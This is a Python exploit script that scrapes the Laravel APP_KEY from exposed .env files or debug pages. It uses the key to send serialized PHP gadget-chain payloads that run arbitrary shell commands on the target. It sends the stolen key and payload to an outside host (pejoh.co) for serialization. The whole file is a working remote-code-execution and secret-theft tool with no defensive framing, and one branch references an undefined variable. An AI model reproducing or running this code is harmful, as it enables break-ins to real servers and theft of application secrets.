import re
import base64
import requests

class rce:
    def __init__(self, url, appkey = None):
        self.url = url
        self.cmd = False
        self.appkey = appkey
        self.method = 1

    def getAppKey(self):
        appkey = None
        headers = {'User-agent':'IDBTE4M CODE87'}
        get_source = requests.get(self.url+"/.env", headers=headers, verify=False, allow_redirects=False, timeout=3).text
        if "APP_KEY=" in get_source:
            appkey = re.findall("\nAPP_KEY=(.*?)\n", get_source)[0]
        else:
            get_source = requests.post(self.url, data={"0x[]":"androxgh0st"}, headers=headers, verify=False, allow_redirects=False, timeout=3).text
            if "<td>APP_KEY</td>" in get_source:
                appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", get_source)[0]
        if appkey:
            self.appkey = appkey.replace('base64:', '')
        else:
            print("{} Is not vuln".format(self.url))

    def serialize(self):
        data = {
            'key': self.appkey,
            'value': self.payload
        }
        resp = requests.post('https://pejoh.co/serial.php', data=data, timeout=3)
        
        hasil = resp.text.strip()
        self.serial = hasil

    def generatePayload(self, cmd, function = 'system'):
        payload = None
        ppp = "<?php {cmd} exit; ?>".format(cmd=cmd)
        if self.method == 1:
            payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:' + str(len(function)) + ':"' + function + '";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
        elif self.method == 2:
            payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";a:1:{i:0;s:' + str(len(function)) + ':"' + function + '";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
        elif self.method == 3:
            payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + str(len(cmd)) + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:' + str(len(function)) + ':"' + function + '";}}}'
        elif self.method == 4:
            payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:' + str(len(function)) + ':"' + function + '";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
        elif self.method == 5:
            payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(ppp)) + ':"' + ppp + '";}}}'
        else:
            payload = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(p)) + ':"' + p + '";}}}}'
        return base64.b64encode(payload)

    def exploit(self):
        if not self.appkey:
            self.getAppKey()
        if not self.cmd:
            self.cmd = raw_input("Command -> ")
        if self.appkey:
            self.appkey = self.appkey.replace('base64:', '')
            self.payload = self.generatePayload(self.cmd)
            self.serialize()
            headers = {
                'Cookie': 'XSRF-TOKEN={}'.format(self.serial)
            }
            get = requests.get(self.url, headers=headers, allow_redirects=False, timeout=3)
            resp = get.text.split('</html>')
            if len(resp) >= 2:
                return resp[1].strip()
            else:
                return False
        else:
            return False

